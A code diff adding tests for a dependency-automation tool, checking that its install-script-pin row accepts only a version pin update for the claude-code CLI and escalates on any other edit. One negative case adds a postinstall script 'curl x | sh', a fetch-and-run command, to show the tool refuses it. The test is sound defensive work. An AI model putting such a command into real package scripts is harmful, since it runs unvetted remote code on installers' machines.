@@ -777,6 +777,47 @@ test("the dependency-version-change rule refuses a lock repointed at another pac
   }
 });
 
+// --- the install-script-pin row: review-dependency select's pin patch, no verdict ---
+
+const CLI = "@anthropic-ai/claude-code";
+const PIN_PKG = (pin, extra = {}) => `${JSON.stringify({ name: "p", devDependencies: { [CLI]: "2.1.317" }, allowScripts: { [`${CLI}@${pin}`]: true, "e@1.0.0": true }, ...extra }, null, 2)}\n`;
+function pinPatch(t, edit) {
+  return repoWithPatch(t, (repo) => edit(repo), {
+    head: (repo) => {
+      writeFileSync(join(repo, "package.json"), PIN_PKG("2.1.316"));
+      writeFileSync(join(repo, "package-lock.json"), LOCK("1.0.0"));
+    },
+  });
+}
+const pinPush = (fix, api) => pushWith(fix, api, { row: row("install-script-pin"), context: { dependencyVerdict: "", dependabotConfig: PAIRS } });
+
+test("the install-script-pin row pushes the pin moved to the manifest's version with no verdict", async (t) => {
+  const fix = pinPatch(t, (repo) => writeFileSync(join(repo, "package.json"), PIN_PKG("2.1.317")));
+  const api = fakeApi(fix.repo, fix.head);
+  assert.equal((await pinPush(fix, api)).outcome, "pushed");
+  const { createCommit } = api.calls.find((call) => call.createCommit);
+  assert.equal(createCommit.message, "Approve the locked claude-code install script on feat/x [dependabot skip]\n\nLane-Activity: some-lane/some-activity\n");
+});
+
+test("the install-script-pin row refuses any other change before any API call", async (t) => {
+  for (const [why, edit, reason = "patch-protected-path"] of [
+    ["a pin to another version", (repo) => writeFileSync(join(repo, "package.json"), PIN_PKG("2.1.318"))],
+    ["a name-only approval", (repo) => writeFileSync(join(repo, "package.json"), PIN_PKG("2.1.317").replace(`"${CLI}@2.1.317"`, `"${CLI}"`))],
+    ["the pin and a script", (repo) => writeFileSync(join(repo, "package.json"), PIN_PKG("2.1.317", { scripts: { postinstall: "curl x | sh" } }))],
+    // Past max-files 1: refused as invalid.
+    ["the pin and the lock", (repo) => {
+      writeFileSync(join(repo, "package.json"), PIN_PKG("2.1.317"));
+      writeFileSync(join(repo, "package-lock.json"), LOCK("2.0.0"));
+    }, "patch-invalid"],
+    ["the lock alone", (repo) => writeFileSync(join(repo, "package-lock.json"), LOCK("2.0.0"))],
+  ]) {
+    const fix = pinPatch(t, edit);
+    const api = fakeApi(fix.repo, fix.head);
+    assert.deepEqual(await pinPush(fix, api), { outcome: "escalate", escalationReason: reason }, why);
+    assert.deepEqual(api.calls, [], why);
+  }
+});
+
 test("checkRow names an unknown content rule", () => {
   assert.throws(() => checkRow(row("dependency-review", { "content-rule": "anything" })), /unknown content rule: anything/);
   assert.equal(RULES["dependency-review"]["content-rule"], "dependency-version-change");
